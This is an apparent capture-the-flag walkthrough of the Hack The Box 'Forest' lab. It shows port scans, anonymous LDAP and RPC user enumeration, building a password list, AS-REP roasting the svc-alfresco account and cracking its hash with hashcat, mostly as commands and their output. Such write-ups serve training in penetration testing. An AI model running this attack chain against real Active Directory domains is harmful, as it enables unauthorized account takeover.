# Hack The Box - Forest Walkthrough 

The [Forest](https://app.hackthebox.com/machines/Forest) machine is an easy Windows Machine with a strong focus on Active Directory exploitation. Here, some knowledge about AD and being able to read a Bloodhound graph should be enough to clear the box.

If you didn’t solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.

## Reconnaissance
In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address.



**Nmap Scan**

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.161
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-08 09:52 EST
Nmap scan report for 10.10.10.161
Host is up (0.25s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-08 15:03:52Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=1/8%OT=88%CT=1%CU=43105%PV=Y%DS=2%DC=I%G=Y%TM=659C0D6D
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TS=A)SEQ(SP=103%GCD=1%IS
OS:R=10B%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10B%CI=I%II=I%TS=A)SEQ(SP=104%GCD=1
OS:%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M
OS:53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=200
OS:0%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%
OS:CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%
OS:A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%
OS:DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m52s, deviation: 4h37m10s, median: 6m50s
| smb2-time: 
|   date: 2024-01-08T15:04:20
|_  start_date: 2024-01-08T14:49:03
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-01-08T07:04:24-08:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 314.33 seconds
```

All-ports scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ cat nmap/all-ports.nmap 
# Nmap 7.93 scan initiated Mon Jan  8 10:04:57 2024 as: nmap -p- -T4 -oA nmap/all-ports 10.10.10.161
Warning: 10.10.10.161 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.161
Host is up (0.26s latency).
Not shown: 65373 closed tcp ports (conn-refused), 139 filtered tcp ports (no-response)
PORT      STATE SERVICE
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49682/tcp open  unknown
49704/tcp open  unknown
49984/tcp open  unknown

# Nmap done at Mon Jan  8 10:49:16 2024 -- 1 IP address (1 host up) scanned in 2659.16 seconds
```

Rust Scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ rustscan -a 10.10.10.161 --range 1-65535 --ulimit 5000
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.161:88
Open 10.10.10.161:135
Open 10.10.10.161:139
Open 10.10.10.161:389
Open 10.10.10.161:593
Open 10.10.10.161:636
Open 10.10.10.161:464
Open 10.10.10.161:445
Open 10.10.10.161:5985
Open 10.10.10.161:9389
Open 10.10.10.161:49664
Open 10.10.10.161:49665
Open 10.10.10.161:49666
Open 10.10.10.161:49671
Open 10.10.10.161:49667
Open 10.10.10.161:49676
Open 10.10.10.161:49677
Open 10.10.10.161:49682
Open 10.10.10.161:49704
Open 10.10.10.161:49984
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 88,135,139,389,593,636,464,445,5985,9389,49664,49665,49666,49671,49667,49676,49677,49682,49704,49984 10.10.10.161

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-08 09:53 EST
Initiating Ping Scan at 09:53
Scanning 10.10.10.161 [2 ports]
Completed Ping Scan at 09:53, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:53
Completed Parallel DNS resolution of 1 host. at 09:53, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:53
Scanning 10.10.10.161 [20 ports]
Discovered open port 135/tcp on 10.10.10.161
Discovered open port 464/tcp on 10.10.10.161
Discovered open port 139/tcp on 10.10.10.161
Discovered open port 445/tcp on 10.10.10.161
Discovered open port 49676/tcp on 10.10.10.161
Discovered open port 389/tcp on 10.10.10.161
Discovered open port 5985/tcp on 10.10.10.161
Discovered open port 49677/tcp on 10.10.10.161
Discovered open port 88/tcp on 10.10.10.161
Discovered open port 49665/tcp on 10.10.10.161
Discovered open port 49667/tcp on 10.10.10.161
Discovered open port 49704/tcp on 10.10.10.161
Discovered open port 49984/tcp on 10.10.10.161
Discovered open port 49682/tcp on 10.10.10.161
Discovered open port 593/tcp on 10.10.10.161
Discovered open port 636/tcp on 10.10.10.161
Discovered open port 49664/tcp on 10.10.10.161
Discovered open port 49666/tcp on 10.10.10.161
Discovered open port 9389/tcp on 10.10.10.161
Discovered open port 49671/tcp on 10.10.10.161
Completed Connect Scan at 09:53, 0.51s elapsed (20 total ports)
Nmap scan report for 10.10.10.161
Host is up, received conn-refused (0.25s latency).
Scanned at 2024-01-08 09:53:08 EST for 1s

PORT      STATE SERVICE        REASON
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
636/tcp   open  ldapssl        syn-ack
5985/tcp  open  wsman          syn-ack
9389/tcp  open  adws           syn-ack
49664/tcp open  unknown        syn-ack
49665/tcp open  unknown        syn-ack
49666/tcp open  unknown        syn-ack
49667/tcp open  unknown        syn-ack
49671/tcp open  unknown        syn-ack
49676/tcp open  unknown        syn-ack
49677/tcp open  unknown        syn-ack
49682/tcp open  unknown        syn-ack
49704/tcp open  unknown        syn-ack
49984/tcp open  unknown        syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
```

Enumeration

Smbclient

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ smbclient -L 10.10.10.161 
Password for [WORKGROUP\darshan]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Crackmapexec

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ crackmapexec smb 10.10.10.161          
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ crackmapexec smb 10.10.10.161 -u '' -p ''
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] htb.local\: STATUS_ACCESS_DENIED
```

LDAPsearch

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ ldapsearch -H 'ldap://10.10.10.161' -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Ldapseach using basedn (-b) as “DC=htb,DC=local”

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ ldapsearch -H 'ldap://10.10.10.161' -x -b "DC=htb,DC=local" > ldapsearch-anonymous.txt

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ cat ldapsearch-anonymous.txt | grep -i memberof
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
memberOf: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
memberOf: CN=Exchange Install Domain Servers,CN=Microsoft Exchange System Obje
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
memberOf: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
memberOf: CN=IIS_IUSRS,CN=Builtin,DC=htb,DC=local
memberOf: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=
memberOf: CN=Managed Availability Servers,OU=Microsoft Exchange Security Group
memberOf: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local
memberOf: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Group

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ ldapsearch -H 'ldap://10.10.10.161' -x -b "DC=htb,DC=local" '(ObjectClass=Person)' > ldapsearch-query-person.txt

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ ldapsearch -H 'ldap://10.10.10.161' -x -b "DC=htb,DC=local" '(ObjectClass=Person)' sAMAccountName | grep sAMAccountName
# requesting: sAMAccountName 
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi

```

Extra shenanigans to print useful stuff

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ ldapsearch -H 'ldap://10.10.10.161' -x -b "DC=htb,DC=local" '(ObjectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
requesting:
Guest
DefaultAccount
FOREST$
EXCH01$
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
andy
mark
santi
```

Creating a username list from above obtained users.

```bash
sebastien
lucinda
andy
mark
santi
```

Creating a custom password list

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ cat custom-passwd-list.txt 
January
February
March
April
May
June
July
August
September
October
November
December
Password
P@ssw0rd
Forest
htb
Secret
Autumn
Fall
Spring
Winter
Summer

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ for i in $(cat custom-passwd-list.txt); do echo $i; echo ${i}2019; echo ${i}2020; echo ${i}\!; done
January
January2019
January2020
January!
February
February2019
February2020
February!
March
March2019
March2020
March!
April
April2019
April2020
April!
May
May2019
May2020
May!
June
June2019
June2020
June!
July
July2019
July2020
July!
August
August2019
August2020
August!
September
September2019
September2020
September!
October
October2019
October2020
October!
November
November2019
November2020
November!
December
December2019
December2020
December!
Password
Password2019
Password2020
Password!
P@ssw0rd
P@ssw0rd2019
P@ssw0rd2020
P@ssw0rd!
Forest
Forest2019
Forest2020
Forest!
htb
htb2019
htb2020
htb!
Secret
Secret2019
Secret2020
Secret!
Autumn
Autumn2019
Autumn2020
Autumn!
Fall
Fall2019
Fall2020
Fall!
Spring
Spring2019
Spring2020
Spring!
Winter
Winter2019
Winter2020
Winter!
Summer
Summer2019
Summer2020
Summer!

-----Chaining a hashcat rule to create better wordlist-----
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ hashcat --force --stdout pwdlist.txt -r /usr/share/hashcat/rules/best64.rule

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ hashcat --force --stdout pwdlist.txt -r /usr/share/hashcat/rules/best64.rule > passwd-list.txt
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ wc -l passwd-list.txt 
6776 passwd-list.txt

-----Chaining two hashcat rules to create bigger wordlist------
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ hashcat --force --stdout pwdlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u | wc -l 
35897
```

Crackmapexec 

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest] 
└─$ crackmapexec smb 10.10.10.161 --pass-pol                                  
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
SMB         10.10.10.161    445    FOREST           Minimum password length: 7
SMB         10.10.10.161    445    FOREST           Password history length: 24
SMB         10.10.10.161    445    FOREST           Maximum password age: Not Set
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
SMB         10.10.10.161    445    FOREST               Domain Refuse Password Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password Store Cleartext: 0
SMB         10.10.10.161    445    FOREST               Domain Password Lockout Admins: 0
SMB         10.10.10.161    445    FOREST               Domain Password No Clear Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password No Anon Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password Complex: 0
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Minimum password age: 1 day 4 minutes 
SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set

NOTE: (--pass-pol: dump password policy)

-----Trying Null SMB Authentication-----
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] htb.local\: STATUS_ACCESS_DENIED 
SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
SMB         10.10.10.161    445    FOREST           Minimum password length: 7
SMB         10.10.10.161    445    FOREST           Password history length: 24
SMB         10.10.10.161    445    FOREST           Maximum password age: Not Set
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
SMB         10.10.10.161    445    FOREST               Domain Refuse Password Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password Store Cleartext: 0
SMB         10.10.10.161    445    FOREST               Domain Password Lockout Admins: 0
SMB         10.10.10.161    445    FOREST               Domain Password No Clear Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password No Anon Change: 0
SMB         10.10.10.161    445    FOREST               Domain Password Complex: 0
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Minimum password age: 1 day 4 minutes 
SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set

```

Enum4linux

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ enum4linux 10.10.10.161
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Using RPCclient to dump domain users (Same as the results given by Enum4linux) 

(svc-alfresco is a new user found)

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

Enumerating svc-alfresco
rpcclient $> queryuser 0x47b
        User Name   :   svc-alfresco
        Full Name   :   svc-alfresco
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Mon, 23 Sep 2019 07:09:48 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Tue, 09 Jan 2024 04:24:51 EST
        Password can change Time :      Wed, 10 Jan 2024 04:24:51 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x47b
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000006
        padding1[0..7]...
        logon_hrs[0..21]...

rpcclient $> queryusergroups 0x47b
        group rid:[0x201] attr:[0x7]
        group rid:[0x47c] attr:[0x7]

-----Querying the above obtained groups
rpcclient $> querygroup 0x201
        Group Name:     Domain Users
        Description:    All domain users
        Group Attribute:7
        Num Members:30
rpcclient $> querygroup 0x47c
        Group Name:     Service Accounts
        Description:
        Group Attribute:7
        Num Members:1
```

Using [GetNPUSers.py](http://GetNPUSers.py) 

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local/                         
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                 
------------  ------------------------------------------------------  --------------------------  --------------------------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2024-01-09 04:52:47.023335  2024-01-09 04:47:48.803963

-----Turning the hash to hashcat format-----
$krb5asrep$23$svc-alfresco@HTB.LOCAL:12d0ff60f8f79b901197733a439c9529$dcdd9c033252cff5d0d777f7cac49ce7ac5f2c35876972901f440c77a040ca9c66319507b29c3bacbcb8f5f253f8cd9051aec88f95b899d83f2e53328bab46b554bcac400707593aa7631ecb71f0b53329a63686c4e150120d76bad6dd78537553be1580de20

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local/ -format hashcat
Impacket v0.11.0 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                 
------------  ------------------------------------------------------  --------------------------  --------------------------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2024-01-09 04:52:47.023335  2024-01-09 04:53:23.257752

$krb5asrep$23$svc-alfresco@HTB.LOCAL:b1d411fc6fc9f663be1f6eb3d0b47d4e$3e08e6a26d5079b6f9307960c7080c9235c818f54acf40bfac9584c17040f4f841efdecc8d5d93ca9224c7142eff505ee3195d273c8ffec54da3e37e77d5478c941918e23e5692e2f536ea701d172715c71e7990ea02cd13d276d30878b9841a3e99ab708f31
```

Cracking the hash using hashcat

```bash
                                                                                                                                                                                                                                       
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
└─$ hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 4800HS with Radeon Graphics, 1441/2947 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 3234

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 46389741090

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5asrep$23$svc-alfresco@HTB.LOCAL:acec1a2bb5496a6112ba3d68033617fa$1c6d6d4ea8354729f6138d57edbec47db731da105ebe74ccf89bafac0dcc6aab32fda96d3aba084ae8601a90f423eb4ba5ee124b9f6d910de103a0a96cb1f3e93f573c1e6fb093969b61eafc73af80426c4ea58082acf0ecebd5f9b08952497f2f596189bc11797fe86b781fa15bb62448cf57693878e8e138afbde7996776bd45f45efe52486a6c44a53f94258c6a6817003232b58f98d9f8b668b0feb50e0ce539335f8b997dd851b0a30c403df4bfe9b4f97cf7d7ace40f4d284eb88787aca27ef87598a7d71a92a1f4f020e46c50d5af8b6f9202dcb1d058c223938e2b5cf019809f218a:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
